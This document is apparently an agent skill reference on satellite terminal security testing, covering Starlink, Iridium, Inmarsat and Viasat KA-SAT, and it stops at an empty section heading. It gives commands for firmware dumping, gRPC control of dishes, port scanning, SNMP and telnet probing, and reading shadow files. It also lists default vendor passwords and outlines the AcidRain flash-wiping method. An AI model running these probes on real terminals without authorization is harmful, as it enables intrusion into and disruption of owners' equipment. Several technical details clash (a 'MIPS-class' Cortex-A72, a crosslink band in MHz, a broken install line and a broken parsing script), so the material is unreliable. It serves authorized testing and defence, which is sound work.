# Satellite & LEO Communication Security — Payloads & Commands

> Companion to `SKILL.md`. Organized by satellite family: Starlink, Iridium, Inmarsat, Viasat KA-SAT, DVB-S/S2, VSAT/iDirect/Hughes, GNSS.
>
> **Scope rule**: TX-side work (VSAT uplink, GPS spoofing broadcast, Iridium/Inmarsat uplink) is restricted to authorized lab / Faraday / open-field test range. The default posture is RX-only.

---

## Table of Contents

1. [Starlink (SpaceX)](#1-starlink-spacex)
2. [Iridium (NEXT)](#2-iridium-next)
3. [Inmarsat (BGAN, FleetExpress, IsatPhone)](#3-inmarsat-bgan-fleetexpress-isatphone)
4. [Viasat KA-SAT (SurfBeam2, AcidRain)](#4-viasat-ka-sat-surfbeam2-acidrain)
5. [DVB-S/S2/S2X (and DVB-RCS, DVB-SH)](#5-dvb-ss2s2x-and-dvb-rcs-dvb-sh)
6. [VSAT — iDirect, Hughes, Newtec, Comtech](#6-vsat-idirect-hughes-newtec-comtech)
7. [GNSS Receiver Attacks (GPS / Galileo / GLONASS / BeiDou / SBAS)](#7-gnss-receiver-attacks)
8. [Other Constellations — OneWeb, Kuiper, Telesat, Globalstar, Swarm, Astrocast, Kineis, Lacuna](#8-other-constellations)
9. [Hub / Gateway Side (Lab only)](#9-hub--gateway-side-lab-only)
10. [Wireshark / PCAP Dissection](#10-wireshark--pcap-dissection)
11. [Reporting / Evidence](#11-reporting--evidence)
12. [Quick Reference Cheat Sheet](#12-quick-reference-cheat-sheet)

---

## 1. Starlink (SpaceX)

Starlink is the largest LEO broadband constellation (5,000+ satellites in orbit as of 2024, planned 12,000–42,000). Each Starlink satellite orbits at 550–570 km and uses Ku-band (10.7–12.7 GHz downlink, 14.0–14.5 GHz uplink) for user traffic and Ka-band (18.3–19.3 GHz down, 28.1–29.1 GHz up) for gateway traffic. The user terminal ("Dishy" or "Dishy McFlatface") is a phased-array antenna with a MIPS-class Broadcom SoC running uClinux.

### 1.1 Dishy Hardware Teardown Notes (reference only)

The Dishy is built around:
- Broadcom BCM2711-class SoC (quad-core Cortex-A72 with custom RF front-end for Ku-band phased array)
- 256 MB–1 GB DDR4 RAM, 32–64 MB SPI NOR flash, eMMC storage
- Custom 802.11ac WiFi + Ethernet router board (the rectangular Dishy integrates the router; the round Dishy has a separate router)
- Power over Ethernet (PoE) input, ~50–110 W typical
- Ku-band phased array of ~1,400 elements in a hexagonal PCB

For lab teardown, the SPI flash is accessible at test pads TP1–TP4 (CLK, MOSI, MISO, CS). Reading requires a CH341A programmer or equivalent at 3.3V with the SoC held in reset. **Do not extract firmware outside an authorized engagement.**

```bash
# Install flashrom and read SPI flash (authorized lab only)
sudo apt install flashrom
# Identify the flash chip via JTAG/Serial (TP1-TP4 on Dishy PCB)
# Read with CH341A programmer (3.3V)
sudo flashrom -p ch341a_spi -r dishy_flash_$(date +%Y%m%d).bin
# Verify size and hash
ls -la dishy_flash_*.bin
sha256sum dishy_flash_*.bin
# Identify uClinux boot partition layout
binwalk dishy_flash_*.bin | head -30
```

### 1.2 Dishy Boot Chain (high-level)

```text
Power-On
  └── BootROM (Broadcom SoC mask ROM, unverifiable)
       └── SPL (Secondary Program Loader from SPI flash, signed)
            └── U-Boot (signed, verifies the next stage)
                 └── Linux kernel (signed with SpaceX root key)
                      └── rootfs (SquashFS, signed)
                           └── starlinkd (gRPC server, MQTT subscriber, monitoring)
                           └── utrm (User Terminal Radio Module, Ku-band PHY control)
```

The boot chain uses a chain-of-trust from the SoC's eFuses down through U-Boot to the Linux kernel. Each stage verifies the signature of the next stage. Firmware images are fetched from `software.starlink.com` over HTTPS and applied via `utrm`'s OTA update subsystem. **Downgrade attacks should fail** — the SoC's eFuses carry the minimum allowed firmware version. Research-grade bypasses (glitching, fault injection) are out of scope for this skill.

### 1.3 Local gRPC API Enumeration (192.168.100.1:9200)

Dishy exposes a plaintext gRPC API on the LAN for status, diagnostics, and engineering access. The API is documented by community projects (sparkydishy/starlink-grpc-tools) by reverse-engineering the proto files from the Android app.

```bash
# Install grpcurl
sudo apt install grpcurl
# Clone the community-published proto schema
git clone https://github.com/sparkydishy/starlink-grpc-tools.git ~/starlink
cd ~/starlink
# List all services (Dishy on 192.168.100.1:9200)
grpcurl -plaintext -import-path . \
  -proto spacex/api/device/device.proto \
  192.168.100.1:9200 list
# Typical output:
#   SpaceX.API.Device.Device
#   SpaceX.API.Device.DeviceLooper
#   SpaceX.API.Device.DeviceRequest
```

### 1.4 Dishy Device Info Retrieval

```bash
# Handle() with empty request returns the full device_info + device_state
grpcurl -plaintext -import-path . \
  -proto spacex/api/device/device.proto \
  -d '{"get_status":{}}' \
  192.168.100.1:9200 SpaceX.API.Device.Device/Handle \
  | python3 -m json.tool > dishy_status.json
# Inspect key fields
python3 -c "
import json
with open('dishy_status.json') as f:
    s = json.load(f)
d = s.get('get_status', {})
print('Hardware version:', d.get('deviceInfo', {}).get('hardwareVersion'))
print('Software version:', d.get('deviceInfo', {}).get('softwareVersion'))
print('Country code:', d.get('deviceInfo', {}).get('countryCode'))
print('UTC seconds:', d.get('deviceInfo', {}).get('utcOffsetS'))
print('Boots:', d.get('deviceInfo', {}).get('bootcount'))
print('Cell ID:', d.get('state', {}).get('cellId'))
print('Pop ID:', d.get('state', {}).get('popId'))
"
```

### 1.5 Obstruction Map & Current Satellite

```bash
# Fetch obstruction map (snr-per-pole, 14x14 grid)
grpcurl -plaintext -import-path . \
  -proto spacex/api/device/device.proto \
  -d '{"get_obstruction_map":{}}' \
  192.168.100.1:9200 SpaceX.API.Device.Device/Handle > obstruction_map.json
# Current satellite the terminal is tracking
grpcurl -plaintext -import-path . \
  -proto spacex/api/device/device.proto \
  -d '{"get_history":{}}' \
  192.168.100.1:9200 SpaceX.API.Device.Device/Handle \
  | python3 -c "
import json, sys
h = json.load(sys.stdin)['get_history']
# Print first few samples of downlink throughput
for i, sample in enumerate(h['samples'][:10]):
    print(f'sample {i}: downlink={sample.get(\"downlinkThroughputBps\",0)/1e6:.2f} Mbps')
"
```

### 1.6 Starlink User Terminal Usage Patterns

```bash
# Query the dish for power & thermal stats (lab monitoring)
grpcurl -plaintext -import-path . \
  -proto spacex/api/device/device.proto \
  -d '{"get_device_info":{}}' \
  192.168.100.1:9200 SpaceX.API.Device.Device/Handle \
  > device_info.json
# Run continuous telemetry collection (every 5s, 5 minutes)
for i in $(seq 1 60); do
    ts=$(date +%s)
    grpcurl -plaintext -import-path . \
      -proto spacex/api/device/device.proto \
      -d '{"get_status":{}}' \
      192.168.100.1:9200 SpaceX.API.Device.Device/Handle \
      > telemetry_${ts}.json
    sleep 5
done
# Aggregate into a CSV
python3 -c "
import json, glob, csv
with open('telemetry.csv','w') as f:
    w = csv.writer(f)
    w.writerow(['ts','popid','cellid','downMbps','upMbps','latencyMs','snr','obstructed'])
    for fn in sorted(glob.glob('telemetry_*.json')):
        ts = fn.split('_')[1].split('.')[0]
        try:
            d = json.load(open(fn)).get('get_status',{})
            popid = d.get('state',{}).get('popId','')
            cellid = d.get('state',{}).get('cellId','')
            down = d.get('downlinkThroughputBps',0)/1e6
            up = d.get('uplinkThroughputBps',0)/1e6
            lat = d.get('popPingLatencyMs',0)
            snr = d.get('snr',0)
            obs = d.get('currentlyObstructed',False)
            w.writerow([ts,popid,cellid,f'{down:.2f}',f'{up:.2f}',lat,snr,obs])
        except Exception as e:
            print('skip', fn, e)
"
```

### 1.7 Starlink DEMO Tool (community)

The `starlink-grpc-tools` package includes a Python library and CLI for batch telemetry collection and graphing. Useful for long-term baseline measurements during engagements.

```bash
# Install starlink-grpc-tools Python library
pip3 install --user starlink-grpc
# CLI: status
python3 -m starlink_grpc.status --target 192.168.100.1:9200
# CLI: history (continuous)
python3 -m starlink_grpc.history --target 192.168.100.1:9200 --interval 5 --samples 120 \
  > starlink_history.csv
# CLI: obstruction map as PNG
python3 -m starlink_grpc.obstruction_map --target 192.168.100.1:9200 \
  --output obstruction.png
```

### 1.8 starlinkground — Fleet Monitoring

For fleet engagements (multiple Dishies), `starlinkground` aggregates telemetry from multiple terminals over MQTT. Each Dishy subscribes to a SpaceX MQTT broker; starlinkground bridges the broker to a local Prometheus instance.

```bash
# Install starlinkground
git clone https://github.com/clarkzjw/starlinkground.git
cd starlinkground
pip3 install -r requirements.txt
# Configure MQTT broker (lab)
cat > config.yaml <<EOF
mqtt:
  broker: mqtt.lab.local
  port: 1883
  topic: starlink/+/telemetry
prometheus:
  port: 9090
EOF
python3 starlinkground.py --config config.yaml &
# Verify Prometheus scrape
curl -s http://localhost:9090/metrics | grep starlink | head -20
```

### 1.9 IPv6 Prefix Enumeration

Starlink terminals receive a /56 IPv6 prefix via DHCPv6-PD from the SpaceX core network, which is then delegated to the LAN /64. The first /64 is the user LAN; subsequent /64s are user-allocatable. Enumerating the prefix reveals the user's geographic cell (via the PoP that the prefix is announced from).

```bash
# On the Starlink router LAN, discover the delegated prefix
ip -6 addr show scope global
# Typical: 2605:59c8:5xxx::/56 delegated to the router
# Enumerate upstream via BGP-looking-glass (routeviews.org)
# Verify the prefix is announced by SpaceX's AS (AS14525)
whois -h whois.radb.net ' -r 2605:59c8::/32' | grep -E '^origin:|^route6:'
# Use a public BGP looking glass to find the announce AS
curl -s 'https://stat.ripe.net/data/announced-prefixes/data.json?resource=AS14525' \
  | python3 -c "
import json,sys
d = json.load(sys.stdin)
prefixes = d['data']['prefixes']
print(f'Starlink announces {len(prefixes)} IPv4/IPv6 prefixes')
for p in prefixes[:5]:
    print(p['prefix'])
"
```

### 1.10 Bypassing Geographic Restrictions (conceptual)

Starlink enforces geographic restrictions (country-level service availability, regulatory compliance) via:
- The terminal's `countryCode` field in device_info (set at activation)
- The PoP the terminal is routed to (each cell maps to a PoP)
- Cell-ID-based restrictions on the SpaceX core network

Bypassing these restrictions is outside the scope of an authorized engagement. Documenting the restriction mechanism is in-scope as a defense/verification exercise.

### 1.11 Starlink Router MIPS Firmware (reference)

The Starlink WiFi router (the small black box behind the round Dishy, or integrated in the rectangular Dishy) runs a MIPS-class SoC (MediaTek MT7621 in early units, Broadcom in later units). The firmware is a custom OpenWRT derivative with a SpaceX web UI overlay. **Firmware extraction is lab-only and authorized-engagement-only.**

```bash
# Acquire firmware via authorized OTA capture (lab)
# Set up a mitmproxy intercepting the router's HTTPS requests
mitmproxy --mode transparent --listen-port 8080 &
# Configure the router to use the mitm proxy as upstream
# Capture firmware image downloads
# Verify firmware signature (if SpaceX uses signed images)
binwalk -e starlink_router.bin
strings -n 8 starlink_router.bin | grep -i 'openwrt\|starlink\|spacex' | head -20
```

### 1.12 Starlink Phased-Array / Beam Tracking

Dishy steers its phased array by computing the optimal phase per element based on the satellite's predicted position (from on-disk TLEs updated every few hours). The steering is invisible to the user but observable via the gRPC obstruction map (which is essentially the SNR per steering direction).

```bash
# Capture the obstruction map over time (one snapshot per minute)
for i in $(seq 1 30); do
    ts=$(date +%s)
    grpcurl -plaintext -import-path . \
      -proto spacex/api/device/device.proto \
      -d '{"get_obstruction_map":{}}' \
      192.168.100.1:9200 SpaceX.API.Device.Device/Handle > obs_${ts}.json
    sleep 60
done
# Map per-pole SNR to sky position
python3 -c "
import json, glob
maps = sorted(glob.glob('obs_*.json'))
print(f'Captured {len(maps)} snapshots')
# Each map is a 14x14 grid of SNR values (valid only for the current satellite)
m = json.load(open(maps[0]))['get_obstruction_map']
print(f'Grid: {len(m[\"rows\"])} rows x {len(m[\"rows\"][0])} cols')
"
```

### 1.13 Starlink Lab — Emulated Dishy for Methodology Development

```bash
# Build a mock gRPC server that mimics Dishy's responses (lab only)
# Useful for engagement scoping without exposing a real terminal
cat > mock_dishy.py <<'PY'
from concurrent import futures
import grpc, json, time
# Use the community-generated proto
import sys
sys.path.insert(0, '/root/starlink')
from spacex.api.device import device_pb2 as pb
from spacex.api.device import device_pb2_grpc as pbg

class MockDishy(pbg.DeviceServicer):
    def Handle(self, request, context):
        response = pb.Response()
        if request.HasField('get_status'):
            response.get_status.deviceInfo.softwareVersion = '1.0.0-mock'
            response.get_status.deviceInfo.hardwareVersion = 'rev3-mock'
            response.get_status.state.popId = 'pop-mock-001'
            response.get_status.state.cellId = 'cell-mock-002'
        return response

server = grpc.server(futures.ThreadPoolExecutor(max_workers=4))
pbg.add_DeviceServicer_to_server(MockDishy(), server)
server.add_insecure_port('127.0.0.1:9200')
server.start()
print('Mock Dishy listening on 127.0.0.1:9200')
server.wait_for_termination()
PY
python3 mock_dishy.py &
```

### 1.14 Starlink Stow / Sleep / Reboot

```bash
# Stow the dish (park the phased array for transport)
grpcurl -plaintext -import-path . \
  -proto spacex/api/device/device.proto \
  -d '{"dish_stow":{}}' \
  192.168.100.1:9200 SpaceX.API.Device.Device/Handle
# Reboot the dish
grpcurl -plaintext -import-path . \
  -proto spacex/api/device/device.proto \
  -d '{"reboot":{}}' \
  192.168.100.1:9200 SpaceX.API.Device.Device/Handle
# Set sleep schedule (turn off radio during off-hours)
grpcurl -plaintext -import-path . \
  -proto spacex/api/device/device.proto \
  -d '{"dish_power_save":{"enable":true,"start_minutes":1320,"duration_minutes":300}}' \
  192.168.100.1:9200 SpaceX.API.Device.Device/Handle
```

### 1.15 Starlink Speed Test & Latency Baseline

```bash
# Capture baseline throughput and latency (uses the Dishy's built-in speedtest)
grpcurl -plaintext -import-path . \
  -proto spacex/api/device/device.proto \
  -d '{"get_history":{}}' \
  192.168.100.1:9200 SpaceX.API.Device.Device/Handle \
  > history_$(date +%s).json
# Parse latency histogram
python3 -c "
import json
h = json.load(open('history_*.json'.replace('*','$(date +%s)')))['get_history']
# The Dishy records a popPingLatencyMs histogram every 1s
buckets = h.get('popPingLatencyMs', [])
import statistics
print(f'Median latency: {statistics.median(buckets):.1f} ms')
print(f'P95 latency: {sorted(buckets)[int(len(buckets)*0.95)]:.1f} ms')
"
# Alternatively, run iperf3 to a known endpoint over the Starlink link
iperf3 -c iperf.he.net -P 4 -t 60 -J > iperf_starlink.json
```

---

## 2. Iridium (NEXT)

Iridium is a 66-satellite LEO constellation at 780 km altitude, providing voice and low-rate data (SBD — Short Burst Data) over L-band (1616–1626.5 MHz). Each satellite has 48 spot beams arranged in a hexagonal pattern. Iridium NEXT (launched 2017–2019, replacing the original Block-1 constellation) hosts secondary payloads including Aireon ADS-B (aviation tracking) and AIS (ship tracking). The constellation is unique in having inter-satellite links (crosslinks) — a satellite can route traffic satellite-to-satellite before downlinking, minimizing the number of ground stations required.

### 2.1 Hardware — Motorola 9520, Iridium GO!, Iridium 9555

```text
Motorola 9520 (1998, original Block-1 era):
  - L-band TDMA burst transceiver, 1616–1626.5 MHz
  - 50 kbps BDPSK per burst (4-slot TDMA frame)
  - 9.6 kbps circuit-switched voice
  - 2.4 kbps SBD (Short Burst Data)

Iridium 9555 (modern handset):
  - L-band TDMA, same modulation
  - Integrated antenna, ~2 W peak EIRP
  - SMS, SBD, voice, 2.4 kbps data

Iridium GO! (portable hotspot):
  - Same radio as 9555
  - WiFi + SBD-to-IP gateway for smartphones
  - Voice calls via the GO! app over WiFi

Iridium Certus (NEXT-era broadband):
  - L-band, up to 700 kbps down / 352 kbps up
  - Maritime and aviation terminals (Thales, Collins, Iridium-certified)
```

### 2.2 gr-iridium — L-Band Burst Demodulator

`gr-iridium` is a GNU Radio flowgraph that captures Iridium L-band bursts and outputs demodulated bitstreams. The default configuration captures at 1621.25 MHz (center of the downlink band) with 2 Msps sampling.

```bash
# Install gr-iridium from source
sudo apt install gnuradio-dev gr-osmosdr lib VOLK dev
git clone https://github.com/muccy/gr-iridium.git
cd gr-iridium
mkdir build && cd build
cmake .. && make -j4 && sudo make install && sudo ldconfig
# Verify install
python3 -c "import iridium; print(iridium.version())"
```

### 2.3 Capture Iridium L-Band with HackRF

```bash
# Capture 60 seconds of Iridium downlink at 1621.25 MHz
# Use an active antenna with bias-tee or external LNA + 1.6 GHz antenna
hackrf_transfer -r iridium_$(date +%Y%m%d_%H%M%S).iq \
  -f 1621250000 -s 2000000 -g 40 -l 40 -a 1 -d 60
# Verify file size: 2 Msps * 2 bytes (I) * 2 bytes (Q) * 60s = 480 MB
ls -la iridium_*.iq
```

### 2.4 Decode Iridium Bursts with gr-iridium

```bash
# Demodulate offline (input IQ, output bitstream + JSON)
gr_iridium -r 2000000 iridium_20260621_120000.iq -o iridium_out
# The tool produces:
#   iridium_out.bits — raw bitstream
#   iridium_out.json — per-burst metadata (timestamp, channel, RSSI, frequency)
# Inspect burst metadata
python3 -c "
import json
bursts = [json.loads(l) for l in open('iridium_out.json')]
print(f'Decoded {len(bursts)} bursts')
# Channel histogram
from collections import Counter
chans = Counter(b['channel'] for b in bursts)
for c, n in chans.most_common(12):
    print(f'  channel {c}: {n} bursts')
"
```

### 2.5 Iridium Channel Mapping (12 Ring-Prioritized Simplex Channels)

Iridium uses 12 downlink channels in the 1616–1626.5 MHz band. Each beam has a primary and secondary channel; the channels are reused across non-adjacent beams (frequency reuse factor ~12).

```text
Channel 1:  1616.20 MHz  (BDPSK, 50 kbps)
Channel 2:  1616.85 MHz
Channel 3:  1617.50 MHz
Channel 4:  1618.15 MHz
Channel 5:  1618.80 MHz
Channel 6:  1619.45 MHz
Channel 7:  1620.10 MHz
Channel 8:  1620.75 MHz
Channel 9:  1621.40 MHz  (most active — broadcast ring channel)
Channel 10: 1622.05 MHz
Channel 11: 1622.70 MHz
Channel 12: 1623.35 MHz  (broadcast ring channel, voice + SBD)
```

```bash
# Map captured bursts to channels
python3 -c "
import json
from collections import defaultdict
bursts = [json.loads(l) for l in open('iridium_out.json')]
freq_to_chan = lambda f: int((f - 1616e6) / 650e3) + 1
per_chan = defaultdict(int)
for b in bursts:
    c = freq_to_chan(b.get('frequency', 0))
    per_chan[c] += 1
for c in sorted(per_chan):
    bar = '#' * (per_chan[c] // 10)
    print(f'  ch{c:2d}: {per_chan[c]:4d}  {bar}')
"
```

### 2.6 SBD (Short Burst Data) Decoding

SBD messages are 1960-byte-maximum packets carrying email, telemetry, or SMS-format payloads. Each SBD burst is transmitted as a single Iridium burst (1–3 seconds airtime). Decoding requires knowing the message format (Iridium SBD Protocol Specification, available under NDA; community implementations exist).

```bash
# Extract SBD bursts from the gr-iridium output
python3 -c "
import json
bursts = [json.loads(l) for l in open('iridium_out.json')]
# SBD bursts are typically on the broadcast ring channels (9, 12) and are longer
sbd = [b for b in bursts if b.get('channel') in (9, 12) and len(b.get('bits','')) > 200]
print(f'Found {len(sbd)} candidate SBD bursts')
for b in sbd[:5]:
    bits = b['bits']
    # SBD preamble is a known 32-bit sync word
    print(f'  ts={b[\"timestamp\"]} bits={len(bits)}')
"
```

### 2.7 Iridium NEXT Satellite Enumeration with gpredict

```bash
# Update TLEs
wget -q -O ~/.config/Gpredict/tle/iridium-NEXT.txt \
  'https://celestrak.org/NORAD/elements/gp.php?GROUP=iridium-NEXT&FORMAT=tle'
# Count active Iridium NEXT satellites
grep -c '^IRIDIUM' ~/.config/Gpredict/tle/iridium-NEXT.txt
# Predict next Iridium NEXT pass from observer location
# (in gpredict GUI: select Iridium NEXT group, click "predict next pass")
```

### 2.8 Iridium Crosslinks (Inter-Satellite Links)

Iridium NEXT satellites have 4 Ka-band inter-satellite links (crosslinks) — two to the satellites ahead/behind in the same orbital plane, and two to the satellites in adjacent planes. This allows traffic to be routed across the constellation before downlinking, reducing the number of ground stations required. Crosslinks operate at 23.18–23.38 GHz and are not receivable from the ground.

```text
Iridium ground link (user link): L-band 1616–1626.5 MHz (down to user)
Iridium feeder link (gateway):   Ka-band 19.4–19.6 GHz (down to gateway)
                                  Ka-band 29.1–29.3 GHz (up from gateway)
Iridium crosslink (inter-sat):   Ka-band 23.18–23.38 MHz (sat-to-sat)
```

### 2.9 Iridium Certus Maritime / Aviation Terminals

```bash
# Identify an Iridium Certus terminal on the LAN (authorized engagement)
nmap -sn 192.168.1.0/24 -oG - | awk '/Up$/{print $2}'
# Iridium Certus terminals (Thales Seatel, Collins) typically expose:
#   - Port 23 (telnet) for engineering access (legacy)
#   - Port 80/443 for web management
#   - Port 502 (Modbus) for SCADA bridge (maritime)
nmap -sV -p 23,80,443,502,1080 192.168.1.0/24
# Banner grab
nc -w 3 192.168.1.10 23 < /dev/null
```

### 2.10 Iridium Pager (SNMS) — Special Notification Messaging Service

Iridium pagers (the older 9501 and 9521 models) receive pages via the SNMS (Special Notification Messaging Service). The pager downlink is in the same L-band allocation but uses a different burst format. SNMS pages have historically been documented as interceptable; the modern pager fleet is small (mostly legacy).

```bash
# Capture and decode SNMS pages (legacy research; receive-only)
# Use the same gr-iridium flowgraph — SNMS bursts appear as anomalous long bursts
# on the broadcast ring channels
python3 -c "
import json
bursts = [json.loads(l) for l in open('iridium_out.json')]
# SNMS pages are ~80 bits (a phone number + short message)
pages = [b for b in bursts if 60 < len(b.get('bits','')) < 200]
print(f'Found {len(pages)} candidate SNMS pages (legacy)')
"
```

---

## 3. Inmarsat (BGAN, FleetExpress, IsatPhone)

Inmarsat operates GEO satellites at 64°E (I-4 Asia-Pacific), 54°W (I-4 Americas), and 178°E (I-4 EMEA), providing L-band (1525–1559 MHz downlink) broadband and voice services. The Broadband Global Area Network (BGAN) family supports 492 kbps per channel (Classic BGAN) or up to 800+ kbps (BGAN Link, Alphasat). FleetExpress is the maritime variant; IsatPhone is the voice handset.

### 3.1 BGAN Terminal Recon

```bash
# Authorized lab: identify a BGAN terminal on the LAN
# BGAN terminals (Hughes HNS-9201, Thrane & Sailor 500, Addvalue Wideye)
# typically expose 192.168.128.100 (Sailor) or 192.168.0.1 (Hughes)
nmap -sV -p 23,80,443,554,5000 192.168.128.0/24
# Default credentials are often:
#   Sailor:    admin / admin
#   Hughes:    admin / (serial number of the terminal)
#   Addvalue:  admin / 1234
# These are documented defaults; rotation in production is a finding.
```

### 3.2 BGAN Web UI Enumeration

```bash
# Authorize engagement: capture BGAN web UI traffic
# (Sailor 500 web UI is plaintext HTTP on port 80)
curl -s http://192.168.128.100/status.cgi | head -50
# Parse GPS position and signal strength (BGAN terminals report their own GPS)
curl -s 'http://192.168.128.100/api/status' | python3 -m json.tool
# Typical fields: lat, lon, satellite, beam, signal_strength, ip_address, dns
```

### 3.3 IsatPhone Voice Encryption (reference)

The IsatPhone Pro uses a proprietary voice codec and encryption. Voice calls are 2.4 kbps AMBE+ (DVSI) over L-band, with optional 3.1 kHz audio for fax. The encryption is not end-to-end; calls are decrypted at the Inmarsat ground station. **Recording IsatPhone calls requires lawful-intercept authorization.**

### 3.4 Sned SBD (Short Burst Data) — Inmarsat Equivalent

Inmarsat's SBD service (called "Sned" on some terminals) provides 2.4–9.6 kbps messaging for IoT and maritime. The protocol is similar to Iridium SBD but on Inmarsat's L-band downlink.

```bash
# Capture Inmarsat L-band (1525–1559 MHz) with RTL-SDR V3
rtl_sdr -f 1545000000 -s 1024000 -g 40 -n 10240000 inmarsat.iq
# Demodulate with a custom GNU Radio flowgraph (not packaged; build per spec)
gnuradio-companion inmarsat_sbd.grc &
# Document the burst metadata
python3 -c "
import json
bursts = [json.loads(l) for l in open('inmarsat_sbd.json')]
print(f'Decoded {len(bursts)} bursts')
"
```

### 3.5 Inmarsat FleetExpress Maritime Terminal Pentest

```bash
# Identify the terminal (Fleet77, Fleet33, Fleet55, FleetBroadband)
nmap -sV -p 23,80,443,161,5000 192.168.1.0/24
# FleetBroadband terminals (Cobham Sailor, Thrane) expose:
#   - Port 80/443 for web management
#   - Port 161 (SNMP) for fleet monitoring (often community='public')
snmpwalk -v2c -c public 192.168.1.10 system | head
# Document findings:
#   - Default credentials (Sailor admin/admin)
#   - SNMP community='public' (read-write?)
#   - Firmware version (FleetBroadband has had CVEs)
```

### 3.6 Inmarsat Terminal Firmware Analysis (authorized lab)

```bash
# Acquire firmware via authorized OTA capture or vendor support portal
# Extract with binwalk
binwalk -e inmarsat_firmware.bin
# Identify the OS (typically VxWorks or embedded Linux)
strings -n 8 _inmarsat_firmware.bin.extracted/squashfs-root/bin/busybox | head
# Look for hardcoded credentials
strings -n 6 _inmarsat_firmware.bin.extracted/squashfs-root/etc/passwd | head
strings -n 6 _inmarsat_firmware.bin.extracted/squashfs-root/etc/shadow | head
# Document any test/debug accounts
```

### 3.7 Inmarsat BGAN Beam Enumeration

```text
Inmarsat I-4 beam structure (per satellite):
  - 1 global beam (covering the entire footprint, low-rate paging/SBD)
  - 19 regional beams (intermediate rate)
  - ~200 narrow spot beams (high-rate BGAN, ~1000 km diameter each)
The beam ID is broadcast on the downlink BCCH (Broadcast Control Channel).
```

```bash
# Receive the Inmarsat BCCH with a HackRF (lab)
hackrf_transfer -r inmarsat_bcch.iq -f 1545000000 -s 1024000 -g 40 -a 1 -d 60
# Demodulate the BCCH (custom flowgraph; not packaged)
# Document the beam ID, satellite ID, and active services
```

### 3.8 FleetBroadband DNS Hijack Test (authorized)

```bash
# Authorized lab: verify the terminal forwards DNS as expected
# Set the terminal's DNS upstream to a controlled DNS server (lab)
# Then verify via tcpdump on the LAN that DNS queries are forwarded
tcpdump -i eth0 -n 'port 53' &
# Issue a DNS query from a LAN host
dig @192.168.1.10 example.com
# Verify the terminal does NOT spoof responses (defense)
```

---

## 4. Viasat KA-SAT (SurfBeam2, AcidRain)

Viasat operates KA-SAT (a Ka-band High-Throughput Satellite at 9°E over Europe, launched 2010, 82 spot beams) and Viasat-1, Viasat-2, and Viasat-3 (Americas). The SurfBeam2 modem is the customer-premises equipment for KA-SAT; it runs a Broadcom MIPS-class SoC with uClinux. The Feb 2022 AcidRain wiper targeted SurfBeam2 modems in the KA-SAT footprint.

### 4.1 SurfBeam2 Hardware Notes (reference)

```text
SurfBeam2 modem internals:
  - Broadcom BCM7413 (MIPS-class SoC, ~400 MHz)
  - 64 MB DDR2 RAM, 16 MB SPI NOR flash, no eMMC
  - uClinux 2.6.x (no MMU)
  - Ka-band RF front-end (20.0 GHz down, 30.0 GHz up)
  - TR-069 provisioning client (the management plane)
  - TtDotMon (management protocol, vendor-specific)
```

### 4.2 SurfBeam2 Firmware Extraction (authorized lab)

```bash
# Extract firmware via JTAG/Serial (TP1-TP6 on the SurfBeam2 PCB)
# Read SPI flash with a CH341A programmer (3.3V)
sudo flashrom -p ch341a_spi -r surfbeam2_flash_$(date +%Y%m%d).bin
# Identify firmware partitions
binwalk surfbeam2_flash_*.bin
# Typical partition layout:
#   0x000000 - 0x010000: uClinux bootloader
#   0x010000 - 0x050000: kernel
#   0x050000 - 0x100000: rootfs (SquashFS)
#   0x100000 - 0x140000: uboot_env (bootargs, mtdparts)
#   0x140000 - 0x1F0000: application
#   0x1F0000 - 0x200000: log & nvram
# Extract rootfs
binwalk -e surfbeam2_flash_*.bin
ls _surfbeam2_flash_*.bin.extracted/squashfs-root/
```

### 4.3 TtDotMon Management Interface (reference)

TtDotMon is Viasat's terminal-side management protocol (similar to TR-069 but proprietary). It runs on a dedicated VLAN from the SurfBeam2 to the gateway. The protocol has, historically, used weak authentication (per-fleet shared keys) — a contributing factor to the AcidRain incident.

```bash
# In an authorized lab, capture TtDotMon traffic from the modem's WAN port
tcpdump -i eth1 -w ttdotmon.pcap 'vlan 100' &
# Analyze in Wireshark (TtDotMon dissector is custom — write a Lua dissector)
wireshark -r ttdotmon.pcap -X 'lua_script:ttdotmon.lua' &
```

### 4.4 KA-SAT Modem Attack Surface (high-level)

```text
1. Local management (LAN side):
   - Web UI on 192.168.0.1
   - Default credentials (admin/admin in early firmware)
   - Diagnostic shell via CSRF-protected forms (Hughes HM/HT class vulnerability)
2. RF side (Ka-band):
   - Downlink: encrypted IP-over-MPE
   - Uplink: TDMA on assigned slot, modem-only authorization (per-modem PSK)
3. Management plane (TtDotMon):
   - Per-fleet shared key (compromise one modem -> compromise all in fleet)
   - Firmware update push from gateway to modem (no signing in early firmware)
4. Boot chain:
   - SPI flash readable via JTAG (no fuses)
   - No secure boot — unsigned firmware accepted in early versions
```

### 4.5 AcidRain Wiper Analysis (post-incident forensics)

The AcidRain wiper (Feb 28, 2022) was purpose-built for the SurfBeam2's MIPS uClinux environment. Its primary destructive behavior was overwriting the SPI flash and any mounted filesystems with `/dev/urandom` output, then rebooting the modem into a bricked state. The wiper was likely delivered via the TtDotMon firmware-update path.

```bash
# Post-incident forensic analysis (on a bricked SurfBeam2 from an authorized site)
# Read the (now overwritten) SPI flash via JTAG
sudo flashrom -p ch341a_spi -r bricked_surfbeam2_flash.bin
# Compare to a known-good image
cmp bricked_surfbeam2_flash.bin known_good_flash.bin
# The flash should be uniformly random (overwritten by /dev/urandom)
ent bricked_surfbeam2_flash.bin
# Expected: entropy ~8.0 bits/byte, no structures
# Document: the wiper was effective; the modem is unrecoverable without JTAG re-flash
```

### 4.6 AcidRain Reverse-Engineering (reference)

Public analysis (SentinelLabs, March 2022) of AcidRain established its MIPS architecture and its strategy of:
1. Stopping user-space processes (`/etc/init.d/rcS stop`)
2. Unmounting filesystems
3. Reading `/dev/urandom` and overwriting `/dev/mtdblock*` (raw flash device nodes)
4. Overwriting mounted filesystems
5. Rebooting — which fails because the boot loader was also overwritten

```bash
# Reference: identify MIPS instructions in a hypothetical wiper sample (authorized)
# Use Ghidra to load the MIPS binary
ghidraRun &
# In Ghidra: File -> Import -> select wiper_mips.elf -> MIPS:BE:32:default
# Look for: open("/dev/urandom"), read(), open("/dev/mtdblock0"), write()
# Document the call chain
```

### 4.7 Viasat KA-SAT Footprint Mapping

```text
KA-SAT coverage (as of 2022):
  - 82 spot beams, each ~250 km diameter
  - 8 gateway earth stations (Greece, Italy, Spain, France, Germany, Hungary, etc.)
  - Total throughput: ~70 Gbps
  - User terminal: SurfBeam2 (commercial) or Viasat Home (residential)
The Feb 2022 incident affected beams primarily in Ukraine, Germany, France, and Italy.
```

### 4.8 HughesNet DSL Modem CSRF (2017 — Historical)
